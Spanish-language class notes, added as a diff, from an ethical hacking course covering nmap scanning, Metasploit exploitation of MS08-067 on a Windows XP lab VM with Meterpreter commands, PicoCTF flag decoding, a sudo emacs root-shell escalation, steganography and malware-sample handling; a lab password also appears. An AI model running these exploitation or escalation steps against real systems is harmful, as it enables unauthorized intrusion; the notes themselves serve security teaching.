@@ -1,0 +1,359 @@
+================================================================================
+                        ETHICAL HACKING — APUNTES DE CLASE
+                  Entorno: Kali Linux (atacante) vs Windows XP (víctima)
+
+════════════════════════════════════════════════════════════════════════════════
+  SESIÓN 1 — 08/05/2026
+════════════════════════════════════════════════════════════════════════════════
+
+CONFIGURACIÓN DE LAS MÁQUINAS VIRTUALES
+----------------------------------------
+Red interna entre dos máquinas virtuales:
+  - 192.168.56.50  → Kali Linux  (atacante)
+  - 192.168.56.101 → Windows XP  (víctima)
+
+Dato: se puede distinguir el SO por el TTL del ping:
+  - Linux   → TTL = 64
+  - Windows → TTL = 128
+
+
+────────────────────────────────────────────────────────────────────────────────
+FASE 1 — RECONOCIMIENTO (Descubrimiento de hosts)
+────────────────────────────────────────────────────────────────────────────────
+
+ARP Scan permite detectar qué equipos están activos en la red local.
+
+  sudo arp-scan -I eth1 --localnet   # Escanea la interfaz eth1
+  sudo arp-scan -l                   # Escanea toda la red local
+
+
+────────────────────────────────────────────────────────────────────────────────
+FASE 2 — ESCANEO DE PUERTOS (Nmap)
+────────────────────────────────────────────────────────────────────────────────
+
+Nmap (Network Mapper) descubre puertos abiertos, servicios y versiones.
+
+  # Solo top 1000 puertos (rápido)
+  nmap -sS -T5 192.168.56.101
+
+  # TODOS los puertos (1–65535)
+  sudo nmap -sS -T5 -p- 192.168.56.101
+
+  # Puerto específico
+  sudo nmap -sS -p 80 192.168.56.101
+
+  # Rango de puertos
+  sudo nmap -sS -p 1-10000 192.168.56.101
+
+Parámetros:
+  -sS  → SYN Scan (semiabierto, no completa la conexión TCP — más silencioso)
+  -T5  → Velocidad máxima (agresiva)
+  -p-  → Todos los 65535 puertos
+
+Puerto 80 abierto = hay un servidor web activo en la víctima.
+
+
+────────────────────────────────────────────────────────────────────────────────
+FASE 3 — DETECCIÓN DE VERSIONES Y SERVICIOS
+────────────────────────────────────────────────────────────────────────────────
+
+Una vez identificados los puertos abiertos, verificamos qué versión de
+software corre en cada uno para buscar vulnerabilidades conocidas.
+
+  nmap -sV -T5 192.168.56.101
+  # -sV → detecta versiones de los servicios en cada puerto
+
+Servicios comunes en Windows XP: Apache (HTTP), MySQL, VNC, SMB (puerto 445).
+
+
+────────────────────────────────────────────────────────────────────────────────
+FASE 3b — ANÁLISIS DEL PUERTO 445 (SMB)
+────────────────────────────────────────────────────────────────────────────────
+
+SMB (Server Message Block) es el protocolo de compartición de archivos de
+Windows. En Windows XP sin parchear es altamente vulnerable.
+
+  # Detectar versión del protocolo SMB
+  nmap --script smb-protocols -p 445 192.168.56.101
+
+  # Buscar vulnerabilidades conocidas (MS08-067, EternalBlue, etc.)
+  nmap --script vuln -p 445 192.168.56.101
+
+IMPORTANTE: La máquina Windows XP NO debe tener internet en el laboratorio.
+Esto evita actualizaciones accidentales y contiene el entorno.
+
+
+────────────────────────────────────────────────────────────────────────────────
+FASE 4 — ANÁLISIS Y EXPLOTACIÓN CON METASPLOIT
+────────────────────────────────────────────────────────────────────────────────
+
+Metasploit Framework es la plataforma de explotación más usada en pentesting.
+
+Componentes principales:
+  - Exploit   → código que aprovecha una vulnerabilidad específica
+  - Payload   → código que se ejecuta en la víctima tras el exploit
+  - NOP sled  → relleno de instrucciones NOP para alinear el payload en memoria
+
+Iniciar Metasploit:
+  msfconsole
+
+
+VULNERABILIDAD MS08-067 — Windows XP (netapi32.dll)
+------------------------------------------------------
+Permite ejecución remota de código sin autenticación en Windows XP sin parche.
+
+  # Buscar el exploit
+  msf6 > search MS08-067
+
+  # Seleccionar el módulo
+  msf6 > use exploit/windows/smb/ms08_067_netapi
+
+  # Ver opciones requeridas
+  msf6 > show options
+
+  # Configurar IP de la víctima
+  msf6 > set RHOSTS 192.168.56.101
+
+  # Ver información detallada del exploit
+  msf6 > show info
+
+  # Verificar si el objetivo es vulnerable (opcional)
+  msf6 > check
+
+  # Lanzar el exploit (dos formas equivalentes)
+  msf6 > exploit
+  msf6 > run
+
+Resultado esperado: sesión de Meterpreter dentro de la máquina víctima.
+
+
+COMANDOS EN METERPRETER (post-explotación)
+-------------------------------------------
+Meterpreter es un payload avanzado que corre en memoria, sin escribir en disco.
+
+  meterpreter > sysinfo    # Info del sistema (OS, hostname, arquitectura)
+  meterpreter > ipconfig   # Interfaces de red de la máquina víctima
+  meterpreter > getuid     # Ver con qué usuario/privilegios estamos
+  meterpreter > help       # Lista completa de comandos disponibles
+  meterpreter > shell      # Abrir una shell de CMD en la víctima
+
+
+────────────────────────────────────────────────────────────────────────────────
+HERRAMIENTA ADICIONAL — WhatWeb
+────────────────────────────────────────────────────────────────────────────────
+
+WhatWeb analiza las tecnologías de un servidor web: CMS, framework, servidor
+HTTP, lenguaje de programación, etc.
+
+  whatweb http://192.168.56.101
+  whatweb http://192.168.56.101 -v    # Modo detallado
+
+
+================================================================================
+  SESIÓN 2 — 14/05/2026 (Jueves, antes del parcial)
+================================================================================
+
+
+────────────────────────────────────────────────────────────────────────────────
+PicoCTF — DESAFÍOS DE CIBERSEGURIDAD
+────────────────────────────────────────────────────────────────────────────────
+
+PicoCTF es una plataforma de competencia en seguridad informática
+(CTF = Capture The Flag). Se resuelve desde Kali Linux.
+
+Red del laboratorio: 10.8.52.x
+Credenciales CyLab Security Academy: +clau123+
+
+Categorías de retos: Reversing, Web, Forensics, Cryptography, Binary Exploitation.
+
+
+Preparación del entorno:
+  mkdir -p /home/COM500/PicoCTF
+  chmod 700 /home/COM500/PicoCTF
+  ls -la
+
+
+Reto: convertme.py — conversión de decimal a binario
+  python3 convertme.py
+
+
+Conexión remota con Netcat:
+  nc <IP_SERVIDOR> <PUERTO>
+  # nc (Netcat) abre una shell remota y espera entrada/salida
+
+
+────────────────────────────────────────────────────────────────────────────────
+PIPELINE DE DECODIFICACIÓN DE FLAGS (5 pasos)
+────────────────────────────────────────────────────────────────────────────────
+
+Las flags en PicoCTF pueden venir codificadas en capas. Se transforman en cadena:
+
+  Paso 1 — Decodificar Base64:
+    echo '<texto>' | base64 -d
+
+  Paso 2 — Invertir el texto:
+    echo '<texto>' | rev
+
+  Paso 3 — Cambiar guiones por guiones bajos:
+    echo '<texto>' | tr '-' '_'
+
+  Paso 4 — Cambiar paréntesis por llaves (formato de flag):
+    echo '<texto>' | tr '()' '{}'
+
+  Paso 5 — Aplicar ROT13 (rotación de letras 13 posiciones):
+    echo '<texto>' | tr 'a-zA-Z' 'n-za-mN-ZA-M'
+
+  Pipeline completo en una sola línea:
+    echo '<entrada>' | base64 -d | rev | tr '-' '_' | tr '()' '{}' | tr 'a-zA-Z' 'n-za-mN-ZA-M'
+
+NOTA: Las flags SIEMPRE usan llaves {}, NUNCA paréntesis.
+      Ejemplo: picoCTF{Reversing_t3xt_}
+
+Referencia útil para tablas de conversión: rapidtables.com
+
+
+────────────────────────────────────────────────────────────────────────────────
+ESCALADA DE PRIVILEGIOS — sudo y GTFOBins
+────────────────────────────────────────────────────────────────────────────────
+
+  sudo -l              # Ver qué comandos puede ejecutar el usuario con sudo
+  sudo -i              # Escalar a shell de root si está permitido
+  whoami               # Verificar usuario actual
+  ls -la               # Listar archivos con permisos
+  cat flag.txt         # Leer la flag
+  pwd                  # Ver directorio actual
+  cd /home             # Navegar al directorio de usuarios
+
+GTFOBins (gtfobins.github.io): referencia de binarios Unix que pueden usarse
+para escalar privilegios si se les concede permisos sudo.
+Ejemplos: emacs, vim, python, find, etc.
+
+  # Escalada a través de emacs (según GTFOBins)
+  sudo emacs -Q -nw --eval '(term "/bin/bash")'
+  # Para salir de emacs: Ctrl+C para interrumpir, Ctrl+X para salir
+
+
+────────────────────────────────────────────────────────────────────────────────
+EDITOR GNU NANO — Atajos esenciales
+────────────────────────────────────────────────────────────────────────────────
+
+  Ctrl + O          → Guardar (luego Enter para confirmar el nombre)
+  Ctrl + X          → Salir
+  Ctrl + X → Y      → Guardar y salir
+  Ctrl + X → N      → Salir sin guardar
+
+
+================================================================================
+  SESIÓN 3 — 11/06/2026 (Jueves)
+================================================================================
+
+
+────────────────────────────────────────────────────────────────────────────────
+ESTEGANOGRAFÍA — Ocultamiento de información
+────────────────────────────────────────────────────────────────────────────────
+
+La esteganografía oculta información dentro de archivos aparentemente normales
+(imágenes, audio, video) sin que el mensaje sea visible.
+
+Diferencia clave:
+  - Criptografía    → oculta el CONTENIDO del mensaje
+  - Esteganografía  → oculta la EXISTENCIA del mensaje
+
+
+Instalación de Steghide:
+  sudo apt update
+  sudo apt install steghide -y
+
+
+Preparar el entorno:
+  mkdir COM560
+  chmod 700 COM560
+  cd COM560
+  ls -la
+
+
+Comandos de Steghide:
+  steghide help                        # Ver lista completa de opciones
+
+  # EMBEBER: ocultar un archivo dentro de una imagen
+  steghide embed -cf imagen.jpeg -sf secreto.txt
+  # -cf = cover file (archivo de portada)
+  # -sf = secret file (archivo a ocultar)
+
+  # EXTRAER: recuperar el archivo oculto de la imagen
+  steghide extract -sf imagen-resultado.jpeg
+
+
+────────────────────────────────────────────────────────────────────────────────
+NÚMEROS MÁGICOS (Magic Numbers / File Signatures)
+────────────────────────────────────────────────────────────────────────────────
+
+Cada tipo de archivo tiene una firma hexadecimal en sus primeros bytes que lo
+identifica independientemente de su extensión.
+
+Ejemplo: un archivo .txt puede ser realmente un PDF si sus primeros bytes
+son 25 50 44 46 (que corresponde a %PDF).
+
+  file imagen.jpeg        # Detecta el tipo real del archivo por su firma
+  xxd imagen.jpeg | head  # Ver los primeros bytes en hexadecimal
+
+Con esta técnica se puede cambiar la extensión de un archivo y verificar
+su tipo real (útil en forense y CTF).
+
+
+────────────────────────────────────────────────────────────────────────────────
+ANÁLISIS DE MALWARE — Conceptos fundamentales
+────────────────────────────────────────────────────────────────────────────────
+
+El análisis de malware SIEMPRE se realiza desde Linux, en una máquina virtual
+aislada sin acceso a internet. Los malware suelen estar escritos en C o C++.
+
+Tipos de análisis:
+  - Estático  → examinar el binario SIN ejecutarlo.
+                Se buscan strings, imports, cabeceras, comentarios del código.
+  - Dinámico  → ejecutar el malware en entorno controlado y observar su
+                comportamiento (red, archivos creados, procesos). Se usa
+                Wireshark para capturar el tráfico.
+
+Conceptos:
+  - C2C (Command & Control) → servidor remoto que controla las máquinas infectadas
+  - Ransomware              → cifra los archivos de la víctima y pide rescate
+
+Fuente de muestras para laboratorio:
+  The Zoo: https://github.com/ytisf/theZoo
+
+  Las muestras vienen en .zip con contraseña: infected
+  Nunca descomprimir ni ejecutar fuera de una VM aislada.
+
+  # Descomprimir la muestra
+  unzip -P infected muestra.zip
+
+  # Identificar tipo de archivo
+  file muestra
+
+  # Ver strings legibles dentro del binario
+  strings muestra | grep -i 'http\|url\|cmd\|pass'
+
+
+HERRAMIENTAS:
+  - REMnux    → distribución Linux especializada para análisis de malware
+  - Wireshark → captura y análisis de tráfico de red (análisis dinámico)
+
+
+────────────────────────────────────────────────────────────────────────────────
+Comandos Linux más usados
+────────────────────────────────────────────────────────────────────────────────
+
+  ls -la              → Listar archivos con permisos y propietarios
+  pwd                 → Mostrar directorio actual
+  cd /ruta            → Cambiar de directorio
+  mkdir <nombre>      → Crear directorio
+  rm <archivo>        → Borrar archivo  (rm -rf para carpetas)
+  chmod 700 <dir>     → Permisos: solo el propietario puede leer/escribir/ejecutar
+  cat <archivo>       → Mostrar contenido de un archivo
+  echo 'texto'        → Imprimir texto en pantalla
+  tr 'a' 'b'          → Reemplazar caracteres (translate)
+  base64 -d           → Decodificar Base64
+  rev                 → Invertir texto
+  file <archivo>      → Detectar tipo de archivo por su firma hexadecimal
+
